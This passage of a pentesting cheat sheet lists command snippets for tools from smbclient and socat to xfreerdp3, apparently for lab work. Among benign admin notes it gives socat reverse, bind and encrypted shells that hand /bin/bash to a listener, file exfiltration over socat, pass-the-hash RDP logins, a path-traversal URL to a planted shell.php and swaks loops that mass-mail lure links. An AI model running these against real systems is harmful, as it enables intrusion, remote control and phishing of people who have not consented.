$ killall -SIGSEGV sleep
```

## simpleproxy

```console
$ simpleproxy -L <LPORT> -R <RHOST>:<RPORT>
```

## SMB

### Prerequisistes

```console
$ sudo apt-get install libguestfs-tools
```

### Common Commands

```console
$ mount.cifs //<RHOST>/<SHARE> /mnt/remote
$ guestmount --add '/<MOUNTPOINT>/<DIRECTORY/FILE>' --inspector --ro /mnt/<MOUNT> -v
```

## smbcacls

```console
$ smcbcacls -N "//<RHOST>/<SHARE>" ''
```

```console
$ for i in $(ls); do echo $i; smbcacls -N "//<RHOST>/<SHARE>" '$i';done >&1 > <FILE>
```

## smbclient

### Common Commands

```console
$ smbclient -L \\<RHOST>\ -N
$ smbclient -L //<RHOST>/ -N
$ smbclient -L ////<RHOST>/ -N
$ smbclient -L //<RHOST>// -U <USERNAME>%<PASSWORD>
$ smbclient -U "<USERNAME>" -L \\\\<RHOST>\\
$ smbclient //<RHOST>/<SHARE>
$ smbclient //<RHOST>/<SHARE> -U <USERNAME>
$ smbclient //<RHOST>/SYSVOL -U <USERNAME>%<PASSWORD>
$ smbclient "\\\\<RHOST>\<SHARE>"
$ smbclient \\\\<RHOST>\\<SHARE> -U '<USERNAME>' --socket-options='TCP_NODELAY IPTOS_LOWDELAY SO_KEEPALIVE SO_RCVBUF=131072 SO_SNDBUF=131072' -t 40000
$ smbclient --no-pass //<RHOST>/<SHARE>
```

### Usage

```console
$ smb:\> allinfo <FILE>
$ smb:\> get <filename>
```

### Anonymous Login

```console
$ smbclient //<RHOST>/<FOLDER> -N
$ smbclient \\\\<RHOST>/<FOLDER> -N
```

### Download multiple Files at once

```console
$ smbclient '\\<RHOST>\<SHARE>'
smb: \> mask ""
smb: \> recurse ON
smb: \> prompt OFF
smb: \> cd 'PATH\TO\REMOTE\DIRECTORY\'
smb: \> lcd '/PATH/TO/LOCAL/DIRECTORY'
smb: \> mget *
```

### Upload multiple Files at once

```console
$ smbclient '\\<RHOST>\<SHARE>'
smb: \> recurse ON
smb: \> prompt OFF
smb: \> mput *
```

### One-liner

```console
$ smbclient '\\<RHOST>\<SHARE>' -N -c 'prompt OFF;recurse ON;cd 'PATH\TO\REMOTE\DIRECTORY';lcd '/PATH/TO/LOCAL/DIRECTORY';mget *'`
```

## smbget

```console
$ smbget -R smb://<RHOST>/<folder>
$ smbget -rR smb://<RHOST>/PATH/TO/SHARE/ -U <USERNAME>
```

## smbmap

```console
$ smbmap -H <RHOST>
$ smbmap -H <RHOST> -R
$ smbmap -u <USERNAME> -p <PASSWORD> -H <RHOST>
```

## smbpasswd

```console
$ smbpasswd -r <RHOST> -U <USERNAME>
```

## socat

### Port Forwarding

```console
$ socat TCP-LISTEN:<LPORT>,fork TCP:<RHOST>:<RPORT>
$ socat -ddd TCP-LISTEN:<LPORT>,fork TCP:<RHOST>:<RPORT>
```

### Reverse Shell

#### Option 1

##### Local System

```console
$ socat file:`tty`,raw,echo=0 tcp-listen:<LPORT>
```

##### Remote System

```console
$ socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:<LHOST>:<LPORT>
```

#### Option 2

##### Local System

```console
$ socat tcp-listen:5986,reuseaddr,fork tcp:<RHOST>:9002
```

##### Remote System

```console
$ socat tcp-listen:9002,reuseaddr,fork tcp:<RHOST>:5968 &
```

### UDP Shell

#### Local System

```console
$ socat file:`tty`,echo=0,raw udp-listen:<LPORT>
```

### Bind Shell

```console
$ sudo socat OPENSSL-LISTEN:443,cert=<FILE>.pem,verify=0,fork EXEC:/bin/bash
$ socat - OPENSSL:<RHOST>:443,verify=0
```

### Send File

```console
$ sudo socat TCP4-LISTEN:443,fork file:<FILE>
$ socat TCP4:<LHOST>:443 file:<FILE>, create    // openssl req -newkey rsa:2048 -nodes -keyout <FILE>.key -x509 -out <FILE>.crt; cat <FILE>.key <FILE>.crt \> <FILE>.pem
```

### Encrypted Connection

#### Create Certificate

```console
$ openssl req --newkey rsa:2048 -nodes -keyout <FILE>.key -x509 -days 362 -out <FILE>.crt
```

#### Create .pem File

```console
$ cat <FILE>.key <FILE>.crt > <FILE>.pem
```

#### Listener

```console
$ socat OPENSSL-LISTEN:<LPORT>,cert=<FILE>.pem,verify=0 -
```

or

```console
socat OPENSSL-LISTEN:<LPORT> FILE:tty,raw,echo=0,cert=<FILE>.pem,verify=0
```

#### Connect

```console
$ socat OPENSSL:<LHOST>:<LPORT>,verify=0 EXEC:/bin/bash
```

or

```console
$ socat OPENSSL:<LHOST>:<LPORT>,verify=0 EXEC:"bash -li",pty,stderr,sigint,setsid,sane
```

## Spaces Cleanup

```console
$ sed -i -e ‘s/\r$//’ <SCRIPT>
```

The tool `dos2unix` does the job too.

## squid

```console
$ cat /var/spool/squid/netdb.state
```

## squidclient

```console
$ sudo apt-get install squidclient
```

```console
$ squidclient -h <RHOST> -w '<PASSWORD>' mgr:fqdncache
```

## SSH

### Fixing SSH Private Key

```console
$ dos2unix id_rsa
$ vim --clean id_rsa
$ chmod 600 id_rsa
```

```console
$ dos2unix id_rsa; vim --clean -c 'wq' id_rsa; chmod 600 id_rsa
```

### Enumerate Username from Private Key

```console
$ ssh-keygen -y -f <SSH_KEY>
```

### Code Execution

```console
$ ssh <USERNAME>@<RHOST> "<COMMAND>"
```

### Force Password Authentication

```console
$ ssh -o PreferredAuthentications=password -o PubkeyAuthentication=no <USERNAME>@<RHOST>
```

### Outdated Ciphers

```console
$ ssh <USERNAME>@<RHOST> -oKexAlgorithms=+diffie-hellman-group1-sha1
```

### Error Message: expecting SSH2_MSG_KEX_ECDH_REPLY

```console
$ sudo ifconfig <INTERFACE> mtu 1200
```

### SSH Key Signing

#### Creating and Signing Keys

```console
$ ssh-keygen -f <NAME> -C "<DESCRIPTION>" -N "<PASSWORD>"
$ ssh-keygen -s <SSH_KEY> -I <IDENTITY> -n <USERNAME> -V +52w <SSH_KEY>.pub
```

#### Authentication

```console
$ ssh -i <SSH_KEY> -o CertificateFile=<USERNAME>-cert.pub <USERNAME>@<RHOST>
```

### Proxyjump / SSH Inception

```console
$ ssh -j <CONFIG_ENTRY> <USER>@<RHOST> cat /tmp/<File> > <FILE>
```

### Port Forward Listener

```console
$ ssh -L <LPORT>:127.0.0.1:<RPORT> <USERNAME>@<RHOST>
$ ssh -N -L <LPORT>:127.0.0.1:<RPORT> <USERNAME>@<RHOST>
```

### Reverse SSH Tunnel

```console
$ ssh -L 80:<LHOST>:80 <RHOST>
$ ssh -L 80:localhost:80 <RHOST>
$ ssh -N -L 0.0.0.0:<LPORT>:<RHOST>:<RPORT> <USERNAME>@<RHOST>
```

### Dynamic Port Forwarding

```console
$ ssh -D 1080 <USERNAME>@<RHOST>
$ ssh -NfD 1080 <USERNAME>@<RHOST>
$ ssh -N -D 0.0.0.0:9999 <USERNAME>@<RHOST>
```

Then use Proxychains with `socks5` with port `1080/TCP` or `9999/TCP` on localhost.

### Remote Port Forwarding

```console
$ ssh -R 8080:<LHOST>:80 <RHOST>
$ ssh -N -R 127.0.0.1:<LPORT>:<RHOST>:<RPORT> <USERNAME>@<RHOST>
```

### Remote Dynamic Port Forwarding

```console
$ ssh -N -R <LHOST> <USERNAME>@<RHOST>
```

## SSH Shell

### Command

```console
~C
```

#### Example

```console
SSH>
```

## sshpass

```console
$ sshpass -p "<PASSWORD>" ssh <USERNAME>@<RHOST>
$ sshpass -p "<PASSWORD>" ssh <USERNAME>@<RHOST> "<COMMAND>"
$ sshpass -p "<PASSWORD>" ssh <USERNAME>@<RHOST> -t bash
$ sshpass -p "<PASSWORD>" sftp <USERNAME>@<RHOST>
```

## stat

```console
$ stat <LOCAL_DIRECTORY>
```

### strace

```console
$ strace -v -f -e execve /PATH/TO/BINARY 2>&1 | grep <NAME>
```

## stty

### Set Size for Reverse Shell

```console
$ stty -a
$ stty rows <NUMBER>
$ stty cols <NUMBER>
```

### Limit Line Output

```console
$ stty rows 2
```

## strings

### Show clean Output

```console
$ strings -n 8 <FILE>
```

## SVN

```console
$ svn checkout svn://<RHOST>/
$ svn diff -r 2
```

## swaks

> https://jetmore.org/john/code/swaks/

> https://github.com/jetmore/swaks

### Basic Commands

```console
$ swaks --server <RHOST> -t <EMAIL> -t <EMAIL> --from <EMAIL> --header "Subject: <SUBJECT>" --body <FILE>.txt --attach @<FILE> --suppress-data -ap
$ swaks --server <RHOST> --port 587 --auth-user "<EMAIL>" --auth-password "<PASSWORD>" --to "<EMAIL>" --from "<EMAIL>" --header "Subject: <SUBJECT>" --body "\\\<LHOST>\"
```

### Automation

```console
$ while read mail; do swaks --to $mail --from <EMAIL> --header "Subject: Test / Test" --body "goto http://<LHOST>/" --server <RHOST>; done < mail.txt
```

## systemd

### Networking Commands

```console
$ ip -c -br address show
$ ip -c -br address show <INTERFACE>
```

### Service Commands

```console
$ systemd-analyze security --no-pager systemd-logind.service
```

## tee

```console
$ cat <FILE> | tee output.txt    // displays the output and also writes it down into a file
```

## Telnet

```console
GET / HTTP/1.1
Host: telnet
Enter
```

## tftp

```console
$ tftp <RHOST>
$ status
$ get
$ put
```

### Working Directory

```console
http://<RHOST>/?file=../../../../var/lib/tftpboot/shell.php
```

## timedatectl

```console
$ timedatectl status
$ sudo dpkg-reconfigure tzdata
```

## Time and Date

### Stop virtualbox-guest-utils to stop syncing Time

```console
$ sudo /etc/init.d/virtualbox-guest-utils stop
```

### Stop systemd-timesyncd to sync Time manually

```console
$ sudo systemctl stop systemd-timesyncd
```

### Options to set the Date and Time

#### net time

```console
$ sudo net time -c <RHOST>
$ sudo net time set -S <RHOST>
$ sudo net time \\<RHOST> /set /y
```

#### ntpdate

```console
$ sudo ntpdate <RHOST>
$ sudo ntpdate -s <RHOST>
$ sudo ntpdate -b -u <RHOST>
```

#### rdate

```console
$ sudo rdate -n <RHOST>
$ sudo rdate -s <RHOST>
```

#### timedatectl

```console
$ sudo timedatectl set-timezone UTC
$ sudo timedatectl list-timezones
$ sudo timedatectl set-timezone '<COUNTRY>/<CITY>'
$ sudo timedatectl set-time 15:58:30
$ sudo timedatectl set-time '2015-11-20 16:14:50'
$ sudo timedatectl set-local-rtc 1
```

### Disable automatic Sync

```console
$ sudo systemctl disable --now chronyd
```

### Get the Server Time

```console
$ sudo nmap -sU -p 123 --script ntp-info <RHOST>
```

### Sync Command

```console
$ sudo date -s "$(curl -si http://<RHOST> | grep "Date: "| sed s/"Date: "//g)"
Sun 02 Jan 2022 01:37:00 PM UTC
```

### Keep in Sync with a Server

```console
$ while [ 1 ]; do sudo ntpdate <RHOST>;done
```

### Hash based on md5 and time

```console
$ php -a
Interactive mode enabled

php > while (true){echo date("D M j G:i:s T Y"); echo " = " ; echo md5('$file_hash' . time());echo "\n";sleep(1);}
```

## Tmux

### Options

```console
:set mouse on
:setw -g mode-keys vi
:set synchronize-panes
```

### List Sessions

```console
$ tmux list-sessions
```

### Attach to Session

```console
$ tmux attach-session -t 0
```

### Window List

```console
ctrl b + w
```

### Copy and Paste

```console
ctrl b + [
space
alt w
ctrl b + ]
```

### Search

```console
ctrl b + [    // enter copy
ctrl + s      // enter search from copy mode
ctrl + r      // search reverse direction
```

### Logging

```console
ctrl b
shift + P    // start / stop
```

#### Save Output

```console
ctrl b + :
capture-pane -S -
ctrl b + :
save-buffer <FILE>.txt
```

#### Enable Automatic Logging

##### .tmux.conf

```console
set-option -g @log-dir "$HOME/.tmux/logs"
if-shell "test ! -d $HOME/tmux-session-logs" "run-shell 'mkdir -p $HOME/.tmux/logs'"
set-hook -g pane-focus-in 'run-shell "tmux pipe-pane -o \"cat >> $HOME/.tmux/logs/pane-#{session_name}_#{window_index}_#{pane_index}.log\""'
```

## TTL

A TTL of `ttl=64` or less, indicates that it is possibly a Linux system.
Windows systems usually use `128`.

## utf8cleaner

```console
$ pip install utf8cleaner
$ utf8cleaner --input <FILE>
```

## uv

> https://github.com/astral-sh/uv

> https://0xdf.gitlab.io/cheatsheets/uv#

## Tooling Installation

```console
$ uv tool install .
$ uv tool install <PACKAGE>
$ uv tool install git+https://github.com/<ACCOUNT>/<REPOSITORY>
$ uv tool install git+https://github.com/<ACCOUNT>/<FILE>.py.git@<PROJECT>
```

### Injection

```console
$ uv tool install --with setuptools <PACKAGE>
```

### Updating

```console
$ uv tool list
$ uv tool upgrade --all
$ uv tool upgrade <PACKAGE>
```

```console
$ uv run --script <SCRIPT>
$ uv add --script <SCRIPT> -r requirements.txt
$ uv add --script <FILE>.py <PACKAGE>
```

## VDH

### Mounting .vdh-Files

```console
$ sudo mount -t cifs //<RHOST>/<FOLDER> /mnt/<LOCAL_DIRECTORY>/ -o user=null
$ sudo apt-get install libguestfs-tools
$ sudo guestmount --add /PATH/TO/MOUNTPOINT/9b9cfbc4-369e-11e9-a17c-806e6f6e6963.vhd --inspector --ro /mnt/
```

## vim

```console
$ :w !sudo tee %   // write to file without opening it
$ :w <FILE>        // save output into a file
$ :sh              // put vim into the background and opens a new shell
$ :%!sort -u       // use a command and pipe the output back to vim
```

### Spawning a Shell

Especially in hardened environments where basic commands like `ls`, `dir` etc. not work.

```console
:set shell=/bin/sh
:shell
```

## VirtualBox

### Fix Copy-and-Paste Issue

```console
$ sudo pkill VBoxClient && VBoxClient --clipboard
```

### Fix Missing Kernel Driver Error (rc=1908)

```console
$ sudo apt-get remove virtualbox-dkms
$ sudo apt-get remove --purge virtualbox-dkms
$ sudo apt-get install -y linux-headers-amd64 linux-image-amd64
$ sudo apt-get install -y virtualbox-dkms
```

## virtualenv

### Linux

```console
$ sudo apt-get install virtualenv
$ python3 -m virtualenv venv
$ . venv/bin/activate
```

#### Python 2.7

```console
$ sudo apt-get install virtualenv
$ virtualenv -p python2.7 venv
$ . venv/bin/activate
```

### Microsoft Windows

```console
C:\Windows\System32> python.exe -m pip install virtualenv
C:\Windows\System32> python.exe -m virtualenv venv
C:\Windows\System32> venv\Scripts\activate
```

## wget

```console
$ wget -r --no-parent <RHOST>/<DIRECTORY>              // recursive download of all files and structure
$ wget -m ftp://anonymous:anonymous@<RHOST>            // ftp download
$ wget -N -r -l inf <RHOST>/PATH/TO/REPOSITORY/.git    // reverse download of a git repository
```

## while loop

```console
while read -r line;
do
   echo "$line" ;
done < /PATH/TO/FILE/<FILE>
```

## Writeable Directories

```console
/dev/shm
/tmp
```

## Windows Subsystem for Linux (WSL)

### Open Optional Features Window

```console
Win+r
optionalfeatures
Enter
```

### Select and install Windows Subsystem for Linux

```console
Windows Subsystem for Linux
```

### Set WSL Default Version

```cmd
PS C:\> wsl --set-default-version 1
```

Open Microsoft App Store and get Kali/Ubuntu.

## Wine

### Winetricks .Net Setup

```console
$ sudo apt-get install -y mono-complete wine winetricks
```

```console
$ winetricks dotnet48
```

## wsgidav

```console
$ wsgidav --host=0.0.0.0 --port=80 --auth=anonymous --root /PATH/TO/FOLDER/
```

## X

```console
$ xdpyinfo -display :0
$ xwininfo -root -tree -display :0
$ XAUTHORITY=/home/<USERNAME>/.Xauthority xdpyinfo -display :0
$ XAUTHORITY=/home/<USERNAME>/.Xauthority xwd -root -screen -silent -display :0 > /tmp/screenshot.xwd
```

## xfreerdp3

### Common Commands

```console
$ xfreerdp3 /v:<RHOST> /u:<USERNAME> /p:<PASSWORD> /cert-ignore
$ xfreerdp3 /v:<RHOST> /u:<USERNAME> /p:<PASSWORD> /d:<DOMAIN> /cert-ignore
$ xfreerdp3 /v:<RHOST> /u:<USERNAME> /p:<PASSWORD> +clipboard
```

### Resolution Handling

```console
$ xfreerdp3 /v:<RHOST> /u:<USERNAME> /p:<PASSWORD> /h:1010 /w:1920 +clipboard
$ xfreerdp3 /v:<RHOST> /u:<USERNAME> /p:<PASSWORD> +dynamic-resolution +clipboard
```

### Folder Sharing

```console
$ xfreerdp3 /v:<RHOST> /u:<USERNAME> /p:<PASSWORD> /cert-ignore /drive:shared,/PATH/TO/FOLDER
```

### Pass-the-Hash

```console
$ xfreerdp3 /u:<USERNAME> /d:<DOMAIN> /pth:'<HASH>' /v:<RHOST> +dynamic-resolution +clipboard
```

### Disable TLS Security Level

```console
$ xfreerdp3 /v:<RHOST> +dynamic-resolution +clipboard /tls:seclevel:0 /sec:nla:off
```

### Fix Error Message: transport_connect_tls:freerdp_set_last_error_ex ERRCONNECT_TLS_CONNECT_FAILED

#### Example

```console
[16:46:07:882] [87307:87308] [ERROR][com.freerdp.core] - transport_connect_tls:freerdp_set_last_error_ex ERRCONNECT_TLS_CONNECT_FAILED [0x00020008]
```

#### Fix

Add `/tls-seclevel:0 /timeout:80000` to the command.

```console
$ xfreerdp3 /u:<USERNAME> /p:<PASSWORD> /v:<RHOST> /tls-seclevel:0 /timeout:80000 +clipboard
```

## xvfb

```console
$ ls -l /xorg/xvfb
```

```console
$ cp /xorg/xvfb/Xvfb_screen0 /tmp/<FILE>.raw
```

```console
$ stat -c %s /xorg/xvfb/Xvfb_screen0
```

```console
$ stat -c %s <FILE>.raw  
```

```console
$ truncate -s 524288 <FILE>.raw
```

```console
$ convert -depth 8 -size 512x256 rgba:<FILE>.raw <FILE>.png
```

## Zip

### Extracing Excel Sheets

```console
$ unzip <FILE>.xslx
```

### Creating Excel Sheets

```console
$ zip -r <FILE>.xls
```

### Creating Password Protected .zip Files

```console
$ zip -re <FILE>.zip <FOLDER>/
```

## zipgrep

```console
$ zipgrep password <FILE>.jar
```
